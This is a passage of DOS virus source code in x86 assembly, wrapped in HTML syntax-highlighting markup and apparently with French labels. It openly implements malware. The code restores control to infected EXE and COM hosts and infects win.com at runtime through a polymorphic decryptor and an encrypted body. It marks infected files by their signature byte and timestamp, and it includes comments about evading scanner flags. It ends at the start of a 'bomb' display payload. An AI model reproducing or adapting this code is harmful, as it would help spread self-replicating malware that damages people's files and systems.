</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vSS</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vSP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annuler_registres</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                 </span><span class="sc1">;far jump to the original exe code</span><span class="sc0">
</span><span class="sc5">contenu</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vIP</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;buffer to stock original file info</span><span class="sc0">
</span><span class="sc5">vCS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;EXE: stock ip, cs, ss, sp</span><span class="sc0">
</span><span class="sc5">vSS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;COM: stock les 5 premiers octets</span><span class="sc0">
</span><span class="sc5">vSP</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">

</span><span class="sc1">;----- 2) terminate a com </span><span class="sc0">

</span><span class="sc5">redonne_main_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;transfer 4 first bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;to file start in memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;avoid flag O</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">                            </span><span class="sc1">;put 100h into stack for the RET</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                                  </span><span class="sc1">;avoid flag B</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annuler_registres</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----- all registers to zero</span><span class="sc0">

</span><span class="sc5">annuler_registres</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;**********************************************************************</span><span class="sc0">
</span><span class="sc1">;*************** infect win.com in runtime mode ***********************</span><span class="sc0">
</span><span class="sc1">;**********************************************************************</span><span class="sc0">

</span><span class="sc5">infecte_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007h</span><span class="sc0">                           </span><span class="sc1">;all attribs</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_win</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;ds:dx= file name (win.com)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4e00h</span><span class="sc0">                           </span><span class="sc1">;find file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">suite_win</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_win</span><span class="sc0">

</span><span class="sc5">suite_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_attrib</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;attribs in memory</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                              </span><span class="sc1">;attribs to zero</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                           </span><span class="sc1">;open file</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_win</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;to file name</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">remise_en_etat2</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                             </span><span class="sc1">;handle in bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">;and in memory</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">                              </span><span class="sc1">;get time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;in memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_date</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;4 bytes to read</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">                           </span><span class="sc1">;read file</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;buffer</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">remise_en_etat</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">      </span><span class="sc1">;already infected?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">continue_inf_win</span><span class="sc0">                            </span><span class="sc1">;no =&gt; continue </span><span class="sc0">

</span><span class="sc5">remise_en_etat</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                             </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">remise_en_etat2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_attrib</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;attribs in cl</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_win</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                                      </span><span class="sc1">;change attribs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                          </span><span class="sc1">;avoid flag F</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_win</span><span class="sc0">

</span><span class="sc5">continue_inf_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;4 first bytes</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win4octets</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;in a temp buffer</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc1">;---------pointer to end of disk file (return size in dx:ax)---------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;size-3 (cause JMP at start)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;remember size</span><span class="sc0">

</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_DEPUIS_RUNTIME</span><span class="sc0">        </span><span class="sc1">;poly, but from runtime routine</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                      </span><span class="sc1">;write decryptor</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                      </span><span class="sc1">;write encrypted body</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;adjust buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                    </span><span class="sc1">;with a jump</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;and with size-3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;and then signature</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">;pointer at file start</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                      </span><span class="sc1">;overwrite 4 first bytes</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_time</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get time/date</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">f_date</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">               </span><span class="sc1">;seconds to 30</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">               </span><span class="sc1">;as infection marker</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">                      </span><span class="sc1">;change time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;avoid flag F</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_attrib</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;attribs in cl</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_win</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                                      </span><span class="sc1">;change attribs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                          </span><span class="sc1">;avoid flag F</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win4octets</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get back 4 win.com</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;first bytes</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc5">fin_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************</span><span class="sc0">
</span><span class="sc1">;******************** BOMB *****************************</span><span class="sc0">
</span><span class="sc1">;*******************************************************</span><span class="sc0">

</span><span class="sc5">bombe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">largeur</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
</span><span class="sc5">profondeur</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">

</span><span class="sc1">;-----------all segments equal to cs-------------</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">terrain</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;--------------------go to VGA mode 13h-------------------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc1">;------------------set color 1 to black----------------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3c8h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">tout_noir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">tout_noir</span><span class="sc0">

</span><span class="sc1">;--------------write black message on screen-------------------------</span><span class="sc0">

</span><span class="sc1">; 1/ select one of the 3 messages randomly</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">msg_bombe</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
        
